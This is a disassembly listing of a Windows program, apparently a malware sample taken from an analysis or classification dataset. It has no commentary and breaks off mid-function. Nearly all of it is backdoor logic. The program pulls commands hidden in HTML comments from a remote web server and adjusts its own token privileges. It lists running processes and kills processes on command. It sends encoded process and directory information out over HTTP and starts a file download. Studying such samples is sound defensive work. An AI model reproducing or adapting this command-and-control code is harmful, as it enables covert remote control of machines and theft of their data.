sub_4010d0
push 0xffffffff
push sub_403317
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
lea ecx [ esp + 0x4 ]
mov [ esp + 0x8 ] 0x0
call Ordinal_MFC42_540
push rw-data
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
call Ordinal_MFC42_941
mov eax [ esp + 0x20 ]
push 0x10
lea ecx [ esp + 0x24 ]
push eax
push ecx
mov ecx esi
call sub_401180
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x2
call Ordinal_MFC42_939
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x1
call Ordinal_MFC42_800
mov esi [ esp + 0x1c ]
lea edx [ esp + 0x4 ]
push edx
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x8 ] 0x1
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_401180
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_403357
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0x0
call Ordinal_MFC42_540
movsx esi [ ebp + 0xc ]
test esi esi
mov [ esp + 0x28 ] 0x1
jge r-xdata
mov edi [ ebp + 0x10 ]
cmp esi edi
jl r-xdata
add esi 0x100
mov cl [ esi + rw-data ]
push ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_940
mov edx [ esp + 0x10 ]
mov eax [ edx - 0x8 ]
cmp eax 0x2
jge r-xdata
mov eax esi
sub esp 0x8
cdq
idiv edi
mov eax esi
mov ebx edx
cdq
idiv edi
mov [ esp + 0x20 ] eax
fild [ esp + 0x20 ]
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
call _ftol
mov esi eax
mov al [ ebx + rw-data ]
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_859
cmp esi edi
jge r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
call Ordinal_MFC42_535
lea ecx [ esp + 0x14 ]
mov [ esp + 0x28 ] 0x2
call Ordinal_MFC42_4203
mov esi [ ebp + 0x8 ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x1c ] 0x1
lea ecx [ esp + 0x14 ]
mov [ esp + 0x28 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x20 ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
push 0x30
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_940
sub_4012a0
push 0xffffffff
push sub_4033a7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebp
push esi
xor esi esi
push edi
mov ebp ecx
mov [ esp + 0x1c ] esi
lea ecx [ esp + 0xc ]
mov [ esp + 0x28 ] 0x1
call Ordinal_MFC42_540
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0x2
call Ordinal_MFC42_540
lea eax [ esp + 0x34 ]
lea ecx [ esp + 0xc ]
push eax
mov [ esp + 0x2c ] 0x3
call Ordinal_MFC42_858
mov ecx [ esp + 0xc ]
mov edi [ ecx - 0x8 ]
test edi edi
jle r-xdata
mov esi [ esp + 0x30 ]
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x1c ] 0x1
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0xc ]
mov [ esp + 0x28 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x34 ]
mov [ esp + 0x28 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x20 ]
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x20
retn 0x8
mov edx [ esp + 0xc ]
mov al [ esi + edx ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x14 ] al
mov ecx [ esp + 0x14 ]
push ecx
push edx
mov ecx ebp
call sub_4010d0
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x4
call Ordinal_MFC42_939
lea ecx [ esp + 0x18 ]
mov [ esp + 0x28 ] 0x3
call Ordinal_MFC42_800
inc esi
cmp esi edi
jl r-xdata
sub_4013a0
push esi
push edi
mov edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4013d0
push 0xffffffff
push sub_4033c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov [ esp + 0x8 ] r--data
mov eax [ esp + 0x20 ]
push ecx
mov ecx esp
mov [ esp + 0x10 ] esp
push eax
mov [ esp + 0x20 ] 0x0
call Ordinal_MFC42_537
lea ecx [ esp + 0x24 ]
push ecx
lea ecx [ esp + 0x10 ]
call sub_4012a0
mov edi [ eax ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x14
retn
sub_401490
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
xor esi esi
xor ebp ebp
xor ebx ebx
push edi
test eax eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
mov edi [ strchr@IAT ]
push 0x3c
push eax
call edi
add esp 0x8
test eax eax
je r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call ??2@YAPAXI@Z
mov ebp eax
push ebp
push ebx
call sub_4013a0
mov edi ebp
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
mov edi ebp
mov [ ecx + ebp ] al
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x28 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x10
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
retn
test esi esi
jne r-xdata
cmp [ eax + 0x1 ] 0x21
jne r-xdata
cmp [ eax + 0x2 ] 0x2d
jne r-xdata
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
cmp [ eax + 0x4 ] 0x20
jne r-xdata
lea ebx [ eax + 0x5 ]
push 0x20
push ebx
call edi
add esp 0x8
test eax eax
je r-xdata
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
cmp dl 0x2d
jne r-xdata
push 0x20
push ecx
call edi
add esp 0x8
test eax eax
je r-xdata
cmp [ eax + 0x2 ] 0x2d
jne r-xdata
jmp r-xdata
cmp [ eax + 0x3 ] 0x3e
je r-xdata
test eax eax
mov [ eax + 0x1 ] 0x0
mov esi 0x1
jne r-xdata
sub_401590
mov eax 0x2008
call sub_4030e0
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ InternetOpenA@IAT ]
mov ebp eax
cmp ebp ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x2008
retn
mov eax [ rw-data ]
push ebx
push 0x80000000
push ebx
push ebx
push eax
push ebp
call [ InternetOpenUrlA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x14 ]
lea edx [ esp + 0x14 ]
[ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
push ecx
push 0x2001
push edx
push esi
stosb [ edi ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov edi [ InternetCloseHandle@IAT ]
push ebp
call edi
test esi esi
je r-xdata
mov ecx [ esp + 0x201c ]
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + eax + 0x1c ] 0x0
call sub_401490
add esp 0x8
test eax eax
je r-xdata
push esi
call edi
mov ebx 0x1
sub_401650
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + ecx * 2 + 0x1 ]
push eax
call ??2@YAPAXI@Z
mov ebx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebx
push ebx
push esi
lea ecx [ ecx + ecx * 2 + 0x1 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
call sub_4013d0
mov edi ebx
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
dec ecx
mov edi ebx
mov [ ecx + ebx ] al
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4016e0
mov eax 0x7098
call sub_4030e0
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x14 ] esi
je r-xdata
xor eax eax
pop esi
add esp 0x7098
retn
mov eax [ rw-data ]
push ebx
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x50
push eax
push esi
call [ InternetConnectA@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x20 ] ebx
je r-xdata
push esi
call [ InternetCloseHandle@IAT ]
pop ebx
xor eax eax
pop esi
add esp 0x7098
retn
mov ecx [ rw-data ]
push ebp
push 0x0
push 0x80000000
push 0x0
push 0x0
push rw-data
push ecx
push rw-data
push ebx
call [ HttpOpenRequestA@IAT ]
mov ebp eax
test ebp ebp
mov [ esp + 0x14 ] ebp
je r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
pop ebp
push edi
mov ecx 0x1800
xor eax eax
lea edi [ esp + 0x10a4 ]
[ edi ]
stosb [ edi ]
mov edi [ esp + 0x70ac ]
lea edx [ esp + 0x10a4 ]
push edx
push edi
call sub_401650
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
mov eax 0x7cf310d7
lea ecx [ ecx + ecx * 2 ]
imul ecx
sar edx 0xb
mov eax edx
mov [ esp + ecx + 0x10a4 ] 0x0
shr eax 0x1f
add edx eax
mov eax ecx
mov esi edx
mov ecx 0x1064
cdq
idiv ecx
mov [ esp + 0x10 ] esi
test edx edx
mov [ esp + 0x24 ] edx
je r-xdata
test esi esi
mov [ esp + 0x14 ] 0x0
jle r-xdata
inc esi
mov [ esp + 0x10 ] esi
push ebp
call [ InternetCloseHandle@IAT ]
mov esi [ esp + 0x20 ]
pop edi
mov ebx [ HttpSendRequestA@IAT ]
lea ebp [ esp + 0x10a4 ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esi - 0x1 ]
cmp ecx eax
jne r-xdata
mov edx 0x1064
test edx edx
jne r-xdata
mov ebx [ esp + 0x28 ]
mov ebp [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
inc eax
add ebp 0x1064
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
mov ecx 0x41d
xor eax eax
lea edi [ esp + 0x2c ]
lea esi [ esp + 0x2c ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x1c ] esi
[ edi ]
not ecx
sub edi ecx
push 0x1077
mov eax ecx
mov esi edi
mov edi [ esp + 0x20 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
mov esi ebp
lea edi [ esp + 0x42 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x30 ] al
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x30 ]
push eax
push 0xffffffff
push rw-data
push ecx
call ebx
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
mov edx [ esp + 0x24 ]
sub_4018e0
mov eax 0x2018
call sub_4030e0
push esi
push edi
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x1c ]
xor esi esi
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x8 ]
push eax
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x2024 ]
lea edx [ esp + 0x10 ]
push edx
push eax
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
push rw-data
jmp r-xdata
mov eax [ esp + 0x8 ]
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
push 0x10
push edx
push 0x0
push eax
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x30 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
push rw-data
jmp r-xdata
lea ecx [ esp + 0x24 ]
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x1c ]
push edx
mov [ esp + ecx + 0x20 ] al
call sub_4016e0
add esp 0x4
mov eax esi
pop edi
pop esi
add esp 0x2018
retn
pop edi
mov eax 0x1
pop esi
add esp 0x2018
retn
call [ GetLastError@IAT ]
push eax
push rw-data
sub_4019d0
mov eax [ esp + 0x4 ]
xor ecx ecx
xor edx edx
push esi
mov cx [ eax + 0xc ]
mov dx [ eax + 0xa ]
push edi
push ecx
push edx
xor ecx ecx
mov cx [ eax + 0x8 ]
xor edx edx
mov dx [ eax + 0x6 ]
mov esi [ esp + 0x18 ]
push ecx
push edx
xor ecx ecx
xor edx edx
mov cx [ eax + 0x2 ]
mov dx [ eax ]
push ecx
push edx
push rw-data
push esi
call [ sprintf@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x20
[ edi ]
not ecx
dec ecx
pop edi
mov [ ecx + esi ] al
pop esi
retn
sub_401a30
mov eax 0x4188
call sub_4030e0
push ebx
push ebp
push esi
push edi
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x190 ]
xor ebx ebx
[ edi ]
push rw-data
mov [ esp + 0x18 ] ebx
stosb [ edi ]
call sub_4018e0
add esp 0x4
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x190 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx ecx
cmp edx 0x2000
jbe r-xdata
push ebx
push 0xf
mov [ esp + 0x70 ] 0x128
call CreateToolhelp32Snapshot
mov esi eax
cmp esi 0xffffffff
mov [ esp + 0x10 ] esi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x190 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x190 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x190 ]
push eax
mov [ esp + ecx + 0x194 ] bl
call sub_4016e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4188
retn
lea eax [ esp + 0x190 ]
push eax
call sub_4016e0
add esp 0x4
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x190 ]
[ edi ]
stosb [ edi ]
call [ GetLastError@IAT ]
push eax
lea edx [ esp + 0x194 ]
push rw-data
push edx
call [ sprintf@IAT ]
lea edi [ esp + 0x19c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x190 ] bl
jmp r-xdata
lea eax [ esp + 0x68 ]
push eax
push esi
call Process32First
test eax eax
jne r-xdata
mov ebp [ sprintf@IAT ]
call [ GetLastError@IAT ]
push eax
lea ecx [ esp + 0x194 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x19c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x190 ] bl
jmp r-xdata
mov eax [ esp + 0x70 ]
push eax
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
mov [ esp + 0x18 ] esi
jne r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x2194 ]
push rw-data
[ edi ]
push rw-data
push rw-data
lea edx [ esp + 0x21a0 ]
push rw-data
push edx
stosb [ edi ]
call ebp
lea edi [ esp + 0x21a8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x2194 ]
lea edx [ esp + 0x190 ]
mov [ esp + ecx + 0x2194 ] bl
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x190 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x190 ] bl
cmp esi ebx
je r-xdata
lea eax [ esp + 0x48 ]
lea ecx [ esp + 0x40 ]
push eax
lea edx [ esp + 0x64 ]
push ecx
lea eax [ esp + 0x40 ]
push edx
push eax
push esi
call [ GetProcessTimes@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x70 ] ebx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
push esi
call [ CloseHandle@IAT ]
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x38 ]
push eax
push ecx
mov [ esp + 0x20 ] ebx
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
jne r-xdata
mov ecx 0x800
lea edi [ esp + 0x2194 ]
[ edi ]
stosb [ edi ]
call [ GetLastError@IAT ]
mov ecx [ esp + 0x70 ]
push eax
push ecx
lea edx [ esp + 0x219c ]
push rw-data
push edx
call ebp
add esp 0x10
jmp r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x2194 ]
[ edi ]
stosb [ edi ]
call [ GetLastError@IAT ]
mov ecx [ esp + 0x70 ]
push eax
lea eax [ esp + 0x90 ]
push eax
push ecx
push rw-data
jmp r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x2194 ]
mov [ esp + 0x14 ] 0x1
[ edi ]
lea ecx [ esp + 0x8c ]
push ecx
push rw-data
push ebx
push rw-data
stosb [ edi ]
lea eax [ esp + 0x50 ]
lea ecx [ esp + 0x30 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov ecx 0x800
lea edi [ esp + 0x2194 ]
[ edi ]
stosb [ edi ]
call [ GetLastError@IAT ]
mov edx [ esp + 0x70 ]
push eax
push edx
lea eax [ esp + 0x219c ]
push rw-data
push eax
call ebp
add esp 0x10
jmp r-xdata
lea edi [ esp + 0x2194 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x2194 ]
mov [ esp + ecx + 0x2194 ] bl
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x190 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx ecx
cmp edx 0x2000
jbe r-xdata
lea edx [ esp + 0x21a4 ]
push edx
call ebp
add esp 0x14
lea edi [ esp + 0x2194 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x190 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x190 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x190 ] bl
jmp r-xdata
lea eax [ esp + 0x190 ]
push eax
call sub_4016e0
add esp 0x4
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x190 ]
[ edi ]
stosb [ edi ]
xor eax eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
lea edx [ esp + 0x50 ]
mov [ esp + 0x20 ] eax
push ecx
mov [ esp + 0x28 ] eax
push edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
call sub_4019d0
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x219c ]
mov edx [ esp + 0x78 ]
[ edi ]
add esp 0x8
lea ecx [ esp + 0x1c ]
stosb [ edi ]
lea eax [ esp + 0x8c ]
push eax
push ecx
push edx
lea eax [ esp + 0x21a0 ]
push rw-data
push eax
call ebp
lea edi [ esp + 0x21a8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x2194 ]
mov [ esp + ecx + 0x2194 ] bl
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x190 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx ecx
cmp edx 0x2000
jbe r-xdata
mov ecx 0x800
lea edi [ esp + 0x2194 ]
[ edi ]
stosb [ edi ]
call [ GetLastError@IAT ]
mov edx [ esp + 0x70 ]
push eax
push edx
lea eax [ esp + 0x219c ]
push rw-data
push eax
call ebp
add esp 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x68 ]
push eax
push ecx
call Process32Next
test eax eax
jne r-xdata
lea edi [ esp + 0x2194 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x190 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x14 ] 0x1
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x190 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x190 ] bl
lea eax [ esp + 0x190 ]
push eax
call sub_4016e0
add esp 0x4
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x190 ]
[ edi ]
stosb [ edi ]
cmp [ esp + 0x14 ] ebx
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esp + 0x10 ] ebx
mov esi [ esp + 0x10 ]
push eax
call [ CloseHandle@IAT ]
sub_401fe0
mov eax [ esp + 0x4 ]
push esi
push edi
push 0x20
push eax
xor edi edi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
cmp [ eax ] 0x20
jne r-xdata
mov dl [ eax ]
mov ecx eax
test dl dl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl 0x20
je r-xdata
sub ecx eax
mov esi ecx
xor ecx ecx
cmp esi 0x5
setle cl
xor edx edx
test esi esi
setg dl
test edx ecx
je r-xdata
cmp dl 0x39
jg r-xdata
push esi
push eax
mov eax [ esp + 0x18 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov eax 0x1
pop edi
pop esi
retn
cmp dl 0x30
jl r-xdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
jne r-xdata
sub_402060
mov eax 0x200c
call sub_4030e0
push ebx
push ebp
xor eax eax
push esi
mov edx [ esp + 0x201c ]
push edi
mov [ esp + 0x10 ] eax
mov ecx 0x800
lea edi [ esp + 0x18 ]
mov [ esp + 0x14 ] ax
[ edi ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
stosb [ edi ]
call sub_401fe0
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call [ atoi@IAT ]
push rw-data
mov edi eax
call sub_4018e0
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x18 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
xor ebx ebx
push edi
push ebx
push 0x1f0fff
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
push eax
lea edx [ esp + 0x1c ]
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0xc
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
xor ebx ebx
mov [ esp + ecx + 0x18 ] bl
jmp r-xdata
push ebx
push esi
call [ TerminateProcess@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x1c ]
push rw-data
push eax
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x18 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx ecx
cmp edx 0x2000
jbe r-xdata
push edi
lea edx [ esp + 0x1c ]
push rw-data
push edx
call [ GetLastError@IAT ]
push eax
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
jmp r-xdata
call [ sprintf@IAT ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
cmp esi ebx
mov [ esp + ecx + 0x18 ] bl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x18 ]
push eax
mov [ esp + ecx + 0x1c ] bl
call sub_4016e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200c
retn
lea eax [ esp + 0x18 ]
push eax
call sub_4016e0
add esp 0x4
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x18 ]
[ edi ]
stosb [ edi ]
push esi
call [ CloseHandle@IAT ]
sub_402230
sub esp 0x108
mov ecx 0x41
xor eax eax
push ebx
push ebp
push esi
push edi
lea edi [ esp + 0x10 ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x10 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
xor dl dl
mov edi rw-data
mov [ esp + eax + 0x10 ] dl
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + ecx + 0x10 ] dl
lea ecx [ esp + 0x10 ]
push ecx
call sub_4016e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x108
retn
sub_4022e0
mov eax 0x2018
call sub_4030e0
push ebx
push ebp
xor ebx ebx
push edi
push ebx
push ebx
push ebx
push ebx
push rw-data
or ebp 0xffffffff
mov [ esp + 0x24 ] ebx
call [ InternetOpenA@IAT ]
mov edi eax
cmp edi ebx
mov [ esp + 0x1c ] edi
je r-xdata
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x2028 ]
push esi
push ebx
push 0x4000000
push ebx
push ebx
push eax
push edi
call [ InternetOpenUrlA@IAT ]
mov esi eax
cmp esi ebx
mov [ esp + 0x10 ] esi
jne r-xdata
mov ecx [ esp + 0x2030 ]
push ebx
push 0x80
push 0x4
push ebx
